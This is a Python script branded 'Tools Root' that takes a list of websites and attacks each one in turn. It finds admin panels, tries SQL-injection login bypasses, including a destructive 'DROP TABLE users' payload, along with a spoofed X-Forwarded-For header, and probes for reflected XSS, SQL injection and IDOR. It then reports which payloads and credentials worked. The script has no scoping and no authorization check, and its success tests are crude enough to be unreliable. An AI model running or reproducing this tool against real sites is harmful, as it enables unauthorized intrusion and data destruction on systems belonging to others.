import requests
import os
import time
from colorama import Fore, init
from tqdm import tqdm
import pyfiglet
import pandas as pd

init(autoreset=True)

admin_paths = [
    "admin", "admin.php", "admin/login.php", "login", "administrator", "adminpanel",
    "admin_login", "cpanel", "dashboard", "admin_area", "admin_console"
]

# Search for the admin page
def find_admin_page(url):
    for path in admin_paths:
        admin_url = f"{url}/{path}"
        try:
            response = requests.get(admin_url, timeout=10)
            if response.status_code == 200 and "login" in response.text.lower():
                return admin_url
        except requests.exceptions.RequestException:
            continue
    return None

# Check for admin bypass
def bypass_admin_panel(admin_url):
    payloads = [
        {"username": "' OR 1=1 --", "password": "any"},
        {"username": "admin", "password": "' OR '1'='1"},
        {"username": "root", "password": "' UNION SELECT 1,2,3 --"},
        {"username": "admin", "password": "'; DROP TABLE users; --"},
    ]
    headers = [
        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
        {"X-Forwarded-For": "127.0.0.1"},
    ]
    for payload in payloads:
        for header in headers:
            try:
                response = requests.post(admin_url, data=payload, headers=header, timeout=10)
                if "dashboard" in response.text.lower() or response.status_code == 200:
                    return {
                        "path": admin_url,
                        "username": payload["username"],
                        "password": payload["password"],
                        "header": header,
                    }
            except requests.exceptions.RequestException:
                continue
    return None

# Check for XSS vulnerabilities
def check_xss(url):
    payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>"]
    results = []
    for payload in payloads:
        try:
            response = requests.get(f"{url}?q={payload}", timeout=10)
            if payload in response.text:
                results.append({"payload": payload, "path": f"{url}?q={payload}"})
        except requests.exceptions.RequestException:
            continue
    return results

# Check for SQL Injection vulnerabilities
def check_sql_injection(url):
    payloads = ["' OR 1=1 --", '" OR "a"="a', "' UNION SELECT NULL, NULL --"]
    results = []
    for payload in payloads:
        try:
            response = requests.get(f"{url}?id={payload}", timeout=10)
            if "error" in response.text.lower() or "mysql" in response.text.lower() or "syntax" in response.text.lower():
                results.append({"payload": payload, "path": f"{url}?id={payload}"})
        except requests.exceptions.RequestException:
            continue
    return results

# Check for IDOR vulnerabilities
def check_idor(url):
    user_ids = [1, 2, 3, 9999]
    results = []
    for user_id in user_ids:
        path = f"{url}/profile/{user_id}"
        try:
            response = requests.get(path, timeout=10)
            if "profile" in response.text and "user" in response.text:
                results.append({"payload": f"User ID: {user_id}", "path": path})
        except requests.exceptions.RequestException:
            continue
    return results

# Display loading bar
def display_loading():
    print(Fore.WHITE + "Loading the tool...")
    bar = tqdm(range(100), desc="Loading", ncols=100, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}")
    for _ in bar:
        time.sleep(0.02)
    print(Fore.GREEN + "Loaded successfully!")

# Display welcome message
def display_welcome():
    ascii_art = pyfiglet.figlet_format("Welcome to Tools Root", font="slant")
    print(Fore.GREEN + ascii_art)
    time.sleep(5)
    os.system('cls' if os.name == 'nt' else 'clear')

# Display program name
def display_program_name():
    ascii_art = pyfiglet.figlet_format("Welcome to the Root Tool", font="slant")
    print(Fore.LIGHTCYAN_EX + ascii_art)

# Scan websites for vulnerabilities
def scan_sites(filename):
    with open(filename, 'r') as file:
        sites = file.readlines()

    results = []

    for site in sites:
        site = site.strip()
        print(Fore.YELLOW + f"Scanning site: {site}")
        time.sleep(1)

        # Search for admin page
        admin_url = find_admin_page(site)
        if admin_url:
            print(Fore.GREEN + f"Admin page found: {admin_url}")
            # Check for admin bypass
            bypass = bypass_admin_panel(admin_url)
            if bypass:
                results.append([
                    site, "Admin Bypass", bypass["path"], bypass["username"], bypass["password"], "Vulnerability Detected"
                ])
            else:
                results.append([site, "Admin Bypass", admin_url, "N/A", "N/A", "No Vulnerabilities"])
        else:
            print(Fore.RED + "Admin page not found. Continuing with other tests...")

        # Check for SQL Injection
        sql_injections = check_sql_injection(site)
        for sql in sql_injections:
            results.append([site, "SQL Injection", sql["path"], sql["payload"], "N/A", "Vulnerability Detected"])

        # Check for XSS
        xss_vulns = check_xss(site)
        for xss in xss_vulns:
            results.append([site, "XSS", xss["path"], xss["payload"], "N/A", "Vulnerability Detected"])

        # Check for IDOR
        idor_vulns = check_idor(site)
        for idor in idor_vulns:
            results.append([site, "IDOR", idor["path"], idor["payload"], "N/A", "Vulnerability Detected"])

    # Display results in a table
    df = pd.DataFrame(results, columns=["Site", "Vulnerability", "Path", "Payload", "Username/Password", "Status"])
    print(Fore.WHITE + df.to_string(index=False))

def main():
    display_loading()
    display_welcome()
    filename = input(Fore.CYAN + "Enter the filename containing the list of websites (e.g., list.txt): ")

    if os.path.exists(filename):
        display_program_name()
        scan_sites(filename)
    else:
        print(Fore.RED + f"File '{filename}' not found! Please ensure the file is in the current directory.")

if __name__ == "__main__":
    main()